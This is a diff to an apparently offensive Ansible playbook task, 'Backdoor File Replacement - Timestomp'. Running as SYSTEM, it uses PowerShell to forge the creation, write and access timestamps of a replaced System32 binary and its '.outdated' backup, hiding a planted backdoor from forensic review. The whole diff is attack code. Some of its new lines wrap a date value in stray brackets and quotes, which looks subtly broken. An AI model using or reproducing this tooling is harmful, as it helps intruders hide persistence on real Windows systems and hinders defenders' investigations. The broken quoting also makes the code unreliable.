@@ -43,13 +43,16 @@
 - name: "Backdoor File Replacement for {{ target }} - Timestomp"
   ansible.windows.win_shell: |
     $targetPath = "C:\Windows\System32\{{ target }}"
-    {% raw %}(Get-Item $targetPath).CreationTime = Get-Date {% endraw %}"{{ file_info.stat.creationtime }}"{% raw %}
-    (Get-Item $targetPath).LastWriteTime = Get-Date {% endraw %}"{{ file_info.stat.lastwritetime }}"{% raw %}
-    (Get-Item $targetPath).LastAccessTime = Get-Date {% endraw %}"{{ file_info.stat.atime }}"{% raw %}
+    $backupPath = $targetPath + ".outdated"
 
-    (Get-Item $backupPath).CreationTime = Get-Date {% endraw %}"{{ file_info.stat.creationtime }}"{% raw %}
-    (Get-Item $backupPath).LastWriteTime = Get-Date {% endraw %}"{{ file_info.stat.lastwritetime }}"{% raw %}
-    (Get-Item $backupPath).LastAccessTime = Get-Date {% endraw %}"{{ file_info.stat.atime }}"
+    {% raw %}(Get-Item $targetPath).CreationTime = Get-Date {% endraw %}"{{ file_info.stat.creationtime }}"
+    {% raw %}(Get-Item $backupPath).CreationTime = Get-Date {% endraw %}"{{ file_info.stat.creationtime }}"
+
+    {% raw %}(Get-Item $targetPath).LastWriteTime = Get-Date {% endraw %}"["{{ file_info.stat.lastwritetime }}"]"
+    {% raw %}(Get-Item $backupPath).LastWriteTime = Get-Date {% endraw %}"["{{ file_info.stat.lastwritetime }}"]"
+
+    {% raw %}(Get-Item $targetPath).LastAccessTime = Get-Date {% endraw %}"{{ file_info.stat.lastaccesstime }}"
+    {% raw %}(Get-Item $backupPath).LastAccessTime = Get-Date {% endraw %}"{{ file_info.stat.lastaccesstime }}"
   become: yes
   become_method: runas
   become_user: System
